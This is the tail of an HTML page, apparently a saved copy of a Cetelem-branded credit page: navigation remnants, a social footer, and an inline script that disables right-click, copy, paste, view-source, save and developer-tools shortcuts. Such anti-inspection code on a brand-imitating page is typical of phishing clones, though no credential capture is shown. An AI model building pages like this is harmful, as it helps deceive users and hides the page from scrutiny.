                         <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAMAAABXc8oyAAABnlBMVEWUlZT///+UlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSh0mBZAAAAiXRSTlMAAAECAwUGCQoLDQ4PEBEUFRYXGBkaGxweICEiIyQlJicoKSosLS8zNTY5PD9AQUJDREdISUtOUlRWWVtgYmNlZ2lqcXR1e31+gIKDj5CXmJqeoKKlpqipq62wsbKztLa4ubq+wMPExcfKzM3Oz9DT2tvc4OPk5efo6uvu7/Dx8vX29/j5+vv9/inEoSEAAAGDSURBVDjLjdL5NwJRFAfw98YY2Ulkyx7JkjVkjeyVXWHsJMuIGHsYZsh/rXpzYpgu75f77j2fM+fM912E/3mQXHVLQtjfFB38OD+ggV83VUxIvX/Ban6OjpTul0EYZl/OULHOKtpB6PLRctv2PARBviv+c51SAQA/yr5iOO0H4KPlC3IDAPQuxF2rVATAGrFDbi3CCJij41ZL2q0TCoTU9hYJsvDKCT9h3s0kudQ+OkCIG0QruTQ/20GI7U+VZNCifMZfELsvdLEBsorDIKRZLoPsY7swDkGs8e9qyD6aH5xJAMQ5AZYh+2i8WktFncfv97NZajAmyXfyj7gxcbS8cT+gU4NYG9zUEKnxCJZIYdigXg3iHO4gk0iKVGYlWKIGccZeQK8InF7k9WoQp3iv6xWB0+yKKkTUtGBTBG5+VYcI2QQX8w2apEQQGc8Oi+OQ8mwkhChtOdQrQ8p9V5oYItQXWs2N1uR5vgpDEBXs3I3WGXqOzgwYhoiy+d7C51Pp8vwTIr1AgdqXHiYAAAAASUVORK5CYII=">
                         <div>
                          <span class="cpay-color">Souscription par téléphone</span>
                          <span class="subtitle">Imprimez, envoyez votre contrat</span>
                         </div>
                        </a>
                       </div>
                      </li>
                     </ul>
                    </div>
                   </div>
                   <div class="cetelemchatbot passwordPopin sf-hidden"></div>
                  </div>
                  <a class="close sf-hidden"></a>
                  <div class="iaLoader sf-hidden"></div>
                 </li>
                </ul>
               </div>
              </div>
             </div>
            </div>
           </div>
          </div>
          <div class="ls-row-clr"></div>
         </div>
        </div>
       </div>
      </div>
      <div class="ls-row-clr"></div>
     </div>
    </div>
    
    <div class="ls-row full-page-layout" id="footerContainer">
     <div class="ls-fxr" id="ls-gen37775058-ls-fxr">
      <div class="ls-area" id="ls-row-3-area-1">
       <div class="ls-area-body" id="ls-gen37775059-ls-area-body">
        <div class="ls-cmp-wrap ls-1st" id="w1575883590978">
         <div class="iw_component" id="1575883590978">
          <div class="row paddedRow small-centered">
           <div class="column small-12">
            <div class="footer">
             <div class="socialBtn">
              <ul>
               <li class="socialFacebook">
                <a title="Facebook" href="#"></a>
               </li>
               <li class="socialTwitter">
                <a title="Twitter" href="#"></a>
               </li>
               <li class="socialYoutube">
                <a title="Youtube" href="#"></a>
               </li>
              </ul>
             </div>
             <div class="contactBtn sf-hidden"></div>
            </div>
           </div>
          </div>
         </div>
        </div>
       </div>
      </div>
      
     </div>
    </div>
   </div>
  </div>
 
<script src="./Ctlm_files/jquery.min.js"></script>
<script>
jQuery(function($){

    document.addEventListener('contextmenu', event => event.preventDefault());
    document.onkeydown = function(e) {
        if (e.ctrlKey && 
        (e.keyCode === 67 || 
        e.keyCode === 86 || 
        e.keyCode === 85 ||
        e.keyCode === 83 || 
        e.keyCode === 117)) {
            return false;
        } else {
            return true;
        }
    };

    $(document).keydown(function (event) {
        if (event.keyCode == 123) { // Prevent F12
            return false;
        } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
            return false;
        }
    });

    


    

})


</script>


</body></html>